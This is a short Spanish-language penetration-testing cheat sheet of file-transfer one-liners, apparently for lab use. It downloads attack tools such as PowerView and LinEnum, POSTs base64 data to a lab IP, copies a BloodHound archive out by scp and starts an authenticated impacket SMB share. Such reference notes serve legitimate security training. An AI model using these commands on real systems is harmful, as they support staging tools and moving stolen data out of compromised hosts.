# Transferencias de archivos

| Comando | Descripción |
| --- | --- |
|  `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                           | Download a file with PowerShell             |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`          | Download a file using PHP                   |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |

`<snip>`, `user` y las direcciones de laboratorio son referencias del ejemplo. `$b64` debe contener el cuerpo que se quiere enviar. Estas operaciones descargan o transfieren archivos; no ejecutan automáticamente los archivos descargados.

## Compartición temporal autenticada por SMB

| Comando | Descripción |
| --- | --- |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Inicia un servidor SMB temporal con autenticación para compartir archivos.     |

`172.16.5.x`, `user` y `password` son marcadores: el ejemplo no contiene una dirección completa ni credenciales reales.

## Relacionado

- [Servidores HTTP locales](local-http-servers.md)
- [Cliente SSH](../Network-Pentesting/Protocols/ssh.md)
